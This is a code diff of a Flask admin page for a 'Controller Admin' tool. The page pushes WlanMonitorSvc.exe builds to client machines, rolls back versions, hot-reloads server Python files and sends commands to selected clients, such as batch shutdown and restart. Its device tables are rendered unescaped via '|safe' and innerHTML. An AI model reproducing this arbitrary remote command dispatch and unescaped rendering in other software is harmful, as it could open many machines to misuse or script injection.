-            window.promptRename = function(mac, oldname) {
-                var newname = prompt("给该设备重命名为:", oldname);
-                if(newname && newname !== oldname) {
-                    fetch('/api/rename', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ mac: mac, name: newname })
-                    }).then(() => {
-                        fetchTables(); // 直接刷新列表看到新名称
-                    });
-                }
-            };
-
-            window.deleteClient = function(mac) {
-                if(!confirm("确定要删除该离线设备的记录吗？")) return;
-                fetch('/api/delete', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({mac: mac})
-                }).then(() => {
-                    alert("设备记录已删除");
-                    fetchTables();
-                });
-            };
-
-            window.showMainContextMenu = function(e) {
-                e.preventDefault();
-                let clickedCheckbox = e.currentTarget.querySelector('.client-check');
-                if (clickedCheckbox && !clickedCheckbox.checked) {
-                    clickedCheckbox.checked = true;
-                }
-
-                let menu = document.getElementById('main-context');
-                if (menu) {
-                    menu.style.display = 'block';
-                    menu.style.left = e.pageX + 'px';
-                    menu.style.top = e.pageY + 'px';
-                }
-            };
-
-            window.hideMainContextMenu = function() {
-                let menu = document.getElementById('main-context');
-                if(menu) menu.style.display = 'none';
-            };
-
-            window.onMainContextAction = function(cmd) {
-                hideMainContextMenu();
-                window.batchCmd(cmd);
-            };
-
-            window.toggleAll = function(source) {
-                var checkboxes = document.querySelectorAll('.client-check');
-                for(var i=0; i<checkboxes.length; i++) checkboxes[i].checked = source.checked;
-            };
-
-            window.quickCmd = function(mac, cmd) {
-                if(!confirm("确定要对该机器执行: " + cmd + " 吗？")) return;
-                fetch('/api/send_cmd', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({mac: mac, cmd: cmd})
-                }).then(() => alert("已下发"));
-            };
-
-            window.batchCmd = function(cmd) {
-                var checked = document.querySelectorAll('.client-check:checked');
-                var macs = [];
-                checked.forEach(c => macs.push(c.value));
-                if(macs.length === 0) return alert("请先勾选需要的设备");
-                if(!confirm("确定要对选中的 " + macs.length + " 台机器执行: " + cmd + " 吗？")) return;
-
-                fetch('/api/batch_cmd', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({macs: macs, cmd: cmd})
-                }).then(() => alert("批量指令已下发"));
-            };
-        </script>
-    </body>
-    </html>
+    <!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover"><title>Controller Admin</title>
+    <style>
+    :root{--bg:#f5f7fb;--panel:#fff;--line:#d9e0ea;--text:#1f2937;--muted:#667085;--blue:#2563eb;--green:#16a34a;--red:#dc2626;--amber:#d97706;--slate:#475569}*{box-sizing:border-box}body{margin:0;background:var(--bg);color:var(--text);font-family:Segoe UI,Arial,sans-serif}.shell{max-width:1180px;margin:0 auto;padding:24px 18px 40px}.topbar{display:flex;justify-content:space-between;gap:16px;align-items:center;margin-bottom:18px}.title h1{margin:0;font-size:30px}.title p{margin:6px 0 0;color:var(--muted)}.logout{background:var(--red);color:#fff;padding:10px 15px;border-radius:6px;text-decoration:none;font-weight:600}.grid{display:grid;grid-template-columns:minmax(0,1.4fr) minmax(320px,.8fr);gap:14px;align-items:start}.panel{background:var(--panel);border:1px solid var(--line);border-radius:8px;padding:16px;margin-bottom:14px;box-shadow:0 1px 2px rgba(15,23,42,.04)}.panel h2{margin:0;font-size:18px}.section-head{display:flex;justify-content:space-between;gap:12px;align-items:flex-start;margin-bottom:12px}.section-head p{margin:5px 0 0;color:var(--muted);font-size:13px}.form-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px}label{display:block;font-size:13px;color:var(--muted);margin-bottom:6px}input[type=text],input[type=file],select{width:100%;padding:9px 10px;border:1px solid var(--line);border-radius:6px;background:#fff;min-height:38px}.radio-row{display:flex;flex-wrap:wrap;gap:10px;margin:8px 0}.radio-card{border:1px solid var(--line);border-radius:6px;padding:9px 10px;background:#f8fafc;cursor:pointer;color:var(--text)}.version-card{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:12px}.metric{background:#f8fafc;border:1px solid var(--line);border-radius:8px;padding:12px}.metric span{color:var(--muted);font-size:12px}.metric b{display:block;margin-top:4px;font-size:22px;color:var(--blue)}.toolbar{display:flex;flex-wrap:wrap;gap:8px;align-items:center}.compact{justify-content:flex-end}.btn,button{border:0;border-radius:6px;padding:9px 12px;background:var(--blue);color:#fff;cursor:pointer;font-weight:600;text-decoration:none;display:inline-block;min-height:36px}.btn.ok,button.ok{background:var(--green)}.btn.danger,button.danger{background:var(--red)}.btn.warn,button.warn{background:var(--amber)}.btn.muted,button.muted{background:var(--slate)}.hint{color:var(--muted);font-size:13px;margin-top:8px}.table-scroll{overflow-x:auto;-webkit-overflow-scrolling:touch}table{width:100%;min-width:920px;border-collapse:separate;border-spacing:0}th{text-align:left;font-size:12px;color:#475467;background:#f8fafc;border-bottom:1px solid var(--line);padding:10px}td{border-bottom:1px solid #edf1f6;padding:10px;vertical-align:top;font-size:13px}code{background:#eef2ff;color:#3730a3;padding:2px 5px;border-radius:4px}.subtle{color:var(--muted);font-size:12px}.focus{max-width:220px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;color:#155eef;font-weight:600}.actions{min-width:260px}.mini{border:1px solid var(--line);background:#fff;color:#344054;border-radius:5px;padding:5px 8px;margin:2px;font-size:12px;font-weight:600;text-decoration:none;display:inline-block;min-height:28px}.mini.link{color:#155eef}.mini.test{background:#fff7ed;border-color:#fed7aa;color:#c2410c}.mini.danger{background:#fee2e2;border-color:#fecaca;color:#b91c1c}.pill{display:inline-block;border-radius:999px;padding:3px 8px;font-size:12px;font-weight:700}.pill.online{background:#dcfce7;color:#166534}.pill.offline{background:#fee2e2;color:#991b1b}.pill.test{background:#ffedd5;color:#9a3412}.pill.stable{background:#e0f2fe;color:#075985}.empty{text-align:center;color:var(--muted);padding:24px}.main-context{display:none;position:absolute;z-index:1000;background:white;border:1px solid var(--line);box-shadow:0 8px 24px rgba(15,23,42,.14);border-radius:8px;padding:6px;min-width:170px}.main-context-item{padding:9px 12px;cursor:pointer;border-radius:6px;font-size:14px}.main-context-item:hover{background:#eff6ff;color:#1d4ed8}@media(max-width:900px){.grid,.form-grid,.version-card{grid-template-columns:1fr}.topbar,.section-head{align-items:stretch;flex-direction:column}.compact{justify-content:flex-start}}@media(max-width:640px){.shell{padding:14px 10px 28px}.title h1{font-size:24px}.panel{padding:12px}.toolbar .btn,.toolbar button{flex:1 1 calc(50% - 8px)}table{min-width:0}thead{display:none}tbody,tr,td{display:block;width:100%}tr{border:1px solid var(--line);border-radius:8px;margin-bottom:10px;background:#fff;overflow:hidden}td{border-bottom:1px solid #edf1f6;padding:9px 10px 9px 42%;min-height:38px;position:relative}td:before{content:attr(data-label);position:absolute;left:10px;top:9px;width:35%;color:var(--muted);font-size:12px;font-weight:700}td:last-child{border-bottom:0}.actions{min-width:0}.focus{max-width:none;white-space:normal}input[type=file]{font-size:13px}}
+    </style></head><body><main class="shell" onclick="window.hideMainContextMenu&&window.hideMainContextMenu()"><div class="topbar"><div class="title"><h1>Controller Admin</h1><p>Release updates, inspect clients, and clean stale records.</p></div><a href="/logout" class="logout">Logout</a></div>
+    <div class="grid"><section class="panel"><div class="section-head"><div><h2>Client Update</h2><p>Stable goes to all clients. Test goes only to devices marked as test channel.</p></div></div><div class="version-card"><div class="metric"><span>Stable version</span><b>{{ current_server_version }}</b></div><div class="metric"><span>Test version</span><b>{{ current_test_version }}</b></div></div><form action="/update_mgmt" method="post" enctype="multipart/form-data"><div class="form-grid"><div><label>Version</label><input type="text" name="version" value="{{ current_server_version }}"></div><div><label>Channel</label><div class="radio-row"><label class="radio-card"><input type="radio" name="channel" value="stable" checked> Stable</label><label class="radio-card"><input type="radio" name="channel" value="test"> Test</label></div></div><div><label>Main EXE: WlanMonitorSvc.exe</label><input type="file" name="file" accept=".exe"></div><div><label>Updater EXE: WlanMonitorSvc.updater.exe</label><input type="file" name="updater_file" accept=".exe"></div></div><div class="toolbar" style="margin-top:14px"><button class="ok" type="submit">Validate and Push</button></div></form></section>
+    <section class="panel"><div class="section-head"><div><h2>Version History</h2><p>Stable and test histories are managed separately.</p></div></div><form action="/rollback_version" method="post"><label>History item</label><select name="history_version"><optgroup label="Stable history">{% for v in stable_history_versions %}<option value="stable|{{ v }}">Stable {{ v }}</option>{% endfor %}</optgroup><optgroup label="Test history">{% for v in test_history_versions %}<option value="test|{{ v }}">Test {{ v }}</option>{% endfor %}</optgroup></select><div class="toolbar" style="margin-top:12px"><button class="warn" type="submit" onclick="return confirm('Rollback and push the selected version?')">Rollback and Push</button><button class="danger" type="submit" formaction="/delete_version" onclick="return confirm('Delete selected server history files?')">Delete Files</button></div><p class="hint">A channel appears here after a version with a main EXE has been uploaded.</p></form></section></div>
+    <section class="panel"><div class="section-head"><div><h2>Server Hot Update</h2><p>Upload same-name .py files and restart the server process automatically.</p></div></div><form action="/update_server" method="post" enctype="multipart/form-data" class="toolbar"><input type="file" name="app_file" accept=".py" multiple style="max-width:420px"><button type="submit" class="muted">Update Server</button></form></section><div id="target-tables">{{ initial_tables|safe }}</div><div id="main-context" class="main-context"><div class="main-context-item" onclick="onMainContextAction('shutdown /s /t 0')">Batch shutdown</div><div class="main-context-item" onclick="onMainContextAction('shutdown /r /t 0')">Batch restart</div><div class="main-context-item" onclick="onMainContextAction('UPDATE_NOW')">Force update</div></div></main>
+    <script>let isUserInteracting=false;window.addEventListener('touchstart',()=>{isUserInteracting=true},{passive:true});window.addEventListener('touchend',()=>setTimeout(()=>{isUserInteracting=false},1000));window.addEventListener('mousedown',()=>{isUserInteracting=true});window.addEventListener('mouseup',()=>setTimeout(()=>{isUserInteracting=false},1000));function checkedValues(s){return Array.from(document.querySelectorAll(s+':checked')).map(c=>c.value)}function fetchTables(){if(isUserInteracting)return;const on=checkedValues('.online-client-check'),off=checkedValues('.offline-client-check'),sp=Array.from(document.querySelectorAll('.table-scroll')).map(c=>c.scrollLeft);fetch('/tables_partial',{credentials:'same-origin'}).then(r=>{if(!r.ok)throw new Error('tables refresh failed');return r.text()}).then(html=>{if(!html.trim())return;document.getElementById('target-tables').innerHTML=html;document.querySelectorAll('.online-client-check').forEach(c=>c.checked=on.includes(c.value));document.querySelectorAll('.offline-client-check').forEach(c=>c.checked=off.includes(c.value));document.querySelectorAll('.table-scroll').forEach((c,i)=>{if(sp[i]!==undefined)c.scrollLeft=sp[i]})}).catch(()=>{})}setInterval(fetchTables,3000);window.toggleTest=mac=>fetch('/api/toggle_test',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({mac})}).then(fetchTables);window.promptRename=(mac,oldname)=>{const name=prompt('Rename device:',oldname);if(name&&name!==oldname)fetch('/api/rename',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({mac,name})}).then(fetchTables)};window.deleteClient=mac=>{if(!confirm('Delete this device record?'))return;fetch('/api/delete',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({mac})}).then(fetchTables)};window.batchDeleteOffline=()=>{const macs=checkedValues('.offline-client-check');if(!macs.length)return alert('Select offline records first.');if(!confirm('Delete '+macs.length+' offline record(s)?'))return;fetch('/api/batch_delete',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({macs})}).then(fetchTables)};window.toggleOnlineAll=()=>{const b=document.querySelectorAll('.online-client-check'),yes=Array.from(b).some(c=>!c.checked);b.forEach(c=>c.checked=yes)};window.toggleOfflineAll=()=>{const b=document.querySelectorAll('.offline-client-check'),yes=Array.from(b).some(c=>!c.checked);b.forEach(c=>c.checked=yes)};window.showMainContextMenu=e=>{e.preventDefault();const box=e.currentTarget.querySelector('.online-client-check');if(box&&!box.checked)box.checked=true;const menu=document.getElementById('main-context');if(menu){menu.style.display='block';menu.style.left=e.pageX+'px';menu.style.top=e.pageY+'px'}};window.hideMainContextMenu=()=>{const menu=document.getElementById('main-context');if(menu)menu.style.display='none'};window.onMainContextAction=cmd=>{hideMainContextMenu();window.batchCmd(cmd)};window.quickCmd=(mac,cmd)=>{if(!confirm('Run '+cmd+' on this client?'))return;fetch('/api/send_cmd',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({mac,cmd})}).then(()=>alert('Sent.'))};window.batchCmd=cmd=>{const macs=checkedValues('.online-client-check');if(!macs.length)return alert('Select online devices first.');if(!confirm('Run '+cmd+' on '+macs.length+' device(s)?'))return;fetch('/api/batch_cmd',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({macs,cmd})}).then(()=>alert('Sent.'))};</script></body></html>
     """
-    return render_template_string(html_template, current_server_version=current_server_version, history_versions=history_versions)
+    return render_template_string(html_template, current_server_version=current_server_version, current_test_version=current_test_version, stable_history_versions=stable_history_versions, test_history_versions=test_history_versions, initial_tables=render_device_tables())
